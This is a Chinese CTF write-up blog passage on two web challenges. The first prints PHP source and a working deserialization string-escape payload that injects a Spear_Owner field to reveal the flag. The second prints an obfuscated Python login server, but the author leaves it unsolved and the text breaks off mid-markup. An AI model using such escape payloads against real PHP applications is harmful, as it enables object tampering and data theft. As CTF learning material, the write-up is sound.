title="夺命十三枪"></a>夺命十三枪</h1><p>一道反序列化字符串逃逸 nm新生赛做这个是吧</p><p>给了源码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">require_once(<span class="string">&#x27;Hanxin.exe.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$Chant = isset($_GET[<span class="string">&#x27;chant&#x27;</span>]) ? $_GET[<span class="string">&#x27;chant&#x27;</span>] : <span class="string">&#x27;夺命十三枪&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$new_visitor = new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant);</span><br><span class="line"></span><br><span class="line">$before = serialize($new_visitor);</span><br><span class="line">$after = Deadly_Thirteen_Spears::Make_a_Move($before);</span><br><span class="line">echo <span class="string">&#x27;Your Movements: &#x27;</span> . $after . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    echo unserialize($after);</span><br><span class="line">&#125;catch (Exception $e) &#123;</span><br><span class="line">    echo <span class="string">&quot;Even Caused A Glitch...&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (basename($_SERVER[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]) === basename(__FILE__)) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Deadly_Thirteen_Spears</span>&#123;</span><br><span class="line">    private static $Top_Secret_Long_Spear_Techniques_Manual = array(</span><br><span class="line">        <span class="string">&quot;di_yi_qiang&quot;</span> =&gt; <span class="string">&quot;Lovesickness&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_er_qiang&quot;</span> =&gt; <span class="string">&quot;Heartbreak&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_san_qiang&quot;</span> =&gt; <span class="string">&quot;Blind_Dragon&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_si_qiang&quot;</span> =&gt; <span class="string">&quot;Romantic_charm&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_wu_qiang&quot;</span> =&gt; <span class="string">&quot;Peerless&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_liu_qiang&quot;</span> =&gt; <span class="string">&quot;White_Dragon&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_qi_qiang&quot;</span> =&gt; <span class="string">&quot;Penetrating_Gaze&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_ba_qiang&quot;</span> =&gt; <span class="string">&quot;Kunpeng&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_jiu_qiang&quot;</span> =&gt; <span class="string">&quot;Night_Parade_of_a_Hundred_Ghosts&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_qiang&quot;</span> =&gt; <span class="string">&quot;Overlord&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_yi_qiang&quot;</span> =&gt; <span class="string">&quot;Letting_Go&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_er_qiang&quot;</span> =&gt; <span class="string">&quot;Decisive_Victory&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_san_qiang&quot;</span> =&gt; <span class="string">&quot;Unrepentant_Lethality&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    public static function Make_a_Move($move)&#123;</span><br><span class="line">        foreach(self::$Top_Secret_Long_Spear_Techniques_Manual <span class="keyword">as</span> $index =&gt; $movement)&#123;</span><br><span class="line">            $move = str_replace($index, $movement, $move);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $move;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span>&#123;</span><br><span class="line"></span><br><span class="line">    public $Chant = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    public $Spear_Owner = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    function __construct($chant)&#123;</span><br><span class="line">        $this-&gt;Chant = $chant;</span><br><span class="line">        $this-&gt;Spear_Owner = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        <span class="keyword">if</span>($this-&gt;Spear_Owner !== <span class="string">&#x27;MaoLei&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Far away from COOL...&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Omg You&#x27;re So COOOOOL!!! &quot;</span> . getenv(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>呢我们的最终目的就是最后一块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> function __toString()&#123;</span><br><span class="line">        <span class="keyword">if</span>($this-&gt;Spear_Owner !== <span class="string">&#x27;MaoLei&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Far away from COOL...&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Omg You&#x27;re So COOOOOL!!! &quot;</span> . getenv(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我们只能get修改Chant值 不能修改Spear_Owner</p><p>再看一眼有经典的先serialize 后unserialize 并且其中还有字符替换的 所以直接就能想到是反序列化字符串逃逸了</p><p>需要将<code>&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code>一部分塞入一共35个</p><p>payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">di_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang<span class="string">&quot;;s:11:&quot;</span>Spear_Owne<span class="string">r&quot;;s:6:&quot;</span>MaoLei<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h1 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h1><p>给了源码：</p><p>有点糊涂 之后看看其他师傅的wp理解一下吧 </p><p>前面的一些处理理解起来有点不懂</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> users, salt</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> http.server</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    FLAG = f.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gethash</span>(<span class="params">*items</span>):</span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        <span class="keyword">if</span> item <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        c ^= <span class="built_in">int</span>.from_bytes(hashlib.md5(<span class="string">f&quot;<span class="subst">&#123;salt&#125;</span>[<span class="subst">&#123;item&#125;</span>]<span class="subst">&#123;salt&#125;</span>&quot;</span>.encode()).digest(), <span class="string">&quot;big&quot;</span>) <span class="comment"># it looks so complex! but is it safe enough?</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(c)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> users</span><br><span class="line"><span class="keyword">assert</span> users[<span class="string">&quot;admin&quot;</span>] == <span class="string">&quot;admin&quot;</span></span><br><span class="line"></span><br><span class="line">hashed_users = <span class="built_in">dict</span>((k,gethash(k,v)) <span class="keyword">for</span> k,v <span class="keyword">in</span> users.items())</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">int</span>.to_bytes(<span class="number">0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164</span>^<span class="number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span>,<span class="number">160</span>,<span class="string">&quot;big&quot;</span>,signed=<span class="literal">True</span>).decode().translate(&#123;<span class="built_in">ord</span>(c):<span class="literal">None</span> <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;\x00&quot;</span>&#125;)) <span class="comment"># what is it?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data:<span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        data = base64.b64encode(data).decode() <span class="comment"># ummm...? It looks like it&#x27;s just base64 encoding it 5 times? truely?</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">__page__ = base64.b64encode(<span class="string">&quot;PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg==&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHandler</span>(http.server.BaseHTTPRequestHandler):</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> self.path == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">self.send_response(<span class="number">200</span>)</span><br><span class="line">self.end_headers()</span><br><span class="line">self.wfile.write(__page__)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">self.send_response(<span class="number">404</span>)</span><br><span class="line">self.end_headers()</span><br><span class="line">self.wfile.write(<span class="string">b&quot;404 Not Found&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line">self.send_response(<span class="number">500</span>)</span><br><span class="line">self.end_headers()</span><br><span class="line">self.wfile.write(<span class="string">b&quot;500 Internal Server Error&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> self.path == <span class="string">&quot;/login&quot;</span>:</span><br><span class="line">body = self.rfile.read(<span class="built_in">int</span>(self.headers.get(<span class="string">&quot;Content-Length&quot;</span>)))</span><br><span class="line">payload = json.loads(body)</span><br><span class="line">params = json.loads(decrypt(payload[<span class="string">&quot;params&quot;</span>]))</span><br><span class="line"><span class="built_in">print</span>(params)</span><br><span class="line"><span class="keyword">if</span> params.get(<span class="string">&quot;username&quot;</span>) == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">self.send_response(<span class="number">403</span>)</span><br><span class="line">self.end_headers()</span><br><span class="line">self.wfile.write(<span class="string">b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">if</span> params.get(<span class="string">&quot;username&quot;</span>) == params.get(<span class="string">&quot;password&quot;</span>):</span><br><span class="line">self.send_response(<span class="number">403</span>)</span><br><span class="line">self.end_headers()</span><br><span class="line">self.wfile.write(<span class="string">b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;same&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">hashed = gethash(params.get(<span class="string">&quot;username&quot;</span>),params.get(<span class="string">&quot;password&quot;</span>))</span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> hashed_users.items():</span><br><span class="line"><span class="keyword">if</span> hashed == v:</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&quot;user&quot;</span>:k,</span><br><span class="line"><span class="string">&quot;hash&quot;</span>:hashed,</span><br><span class="line"><span class="string">&quot;flag&quot;</span>: FLAG <span class="keyword">if</span> k == <span class="string">&quot;admin&quot;</span> <span class="keyword">else</span> <span class="string">&quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">self.send_response(<span class="number">200</span>)</span><br><span class="line">self.end_headers()</span><br><span class="line">self.wfile.write(json.dumps(data).encode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">self.send_response(<span class="number">403</span>)</span><br><span class="line">self.end_headers()</span><br><span class="line">self.wfile.write(<span class="string">b&quot;Invalid username or password&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">self.send_response(<span class="number">404</span>)</span><br><span class="line">self.end_headers()</span><br><span class="line">self.wfile.write(<span class="string">b&quot;404 Not Found&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line">self.send_response(<span class="number">500</span>)</span><br><span class="line">self.end_headers()</span><br><span class="line">self.wfile.write(<span class="string">b&quot;500 Internal Server Error&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">server = http.server.HTTPServer((<span class="string">&quot;&quot;</span>, <span class="number">9999</span>), MyHandler)</span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure><p>登录逻辑</p><figure class="highlight javascript"><table><tr><td 